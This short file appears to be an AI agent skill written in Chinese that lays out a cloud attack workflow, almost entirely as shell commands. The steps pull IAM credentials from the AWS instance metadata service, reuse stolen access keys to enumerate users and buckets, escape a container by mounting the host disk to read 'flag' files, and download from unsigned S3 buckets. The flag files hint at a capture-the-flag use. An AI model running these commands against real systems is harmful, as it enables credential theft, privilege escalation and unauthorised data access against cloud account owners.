---
name: cloud
description: 云安全攻击。覆盖 AWS/云凭证枚举、IAM 提权、存储桶错配、元数据服务滥用、容器逃逸。
---

# 云攻击流程

## 元数据服务
```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## AWS 凭证利用
```bash
export AWS_ACCESS_KEY_ID=xxx
export AWS_SECRET_ACCESS_KEY=xxx
aws sts get-caller-identity
aws s3 ls
aws iam list-users
```

## 容器逃逸
```bash
# 检查是否在容器内
cat /proc/1/cgroup
ls /.dockerenv
# 挂载宿主机
mount /dev/sda1 /mnt
cat /mnt/flag*
```

## S3 存储桶
```bash
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/secret.txt ./
```
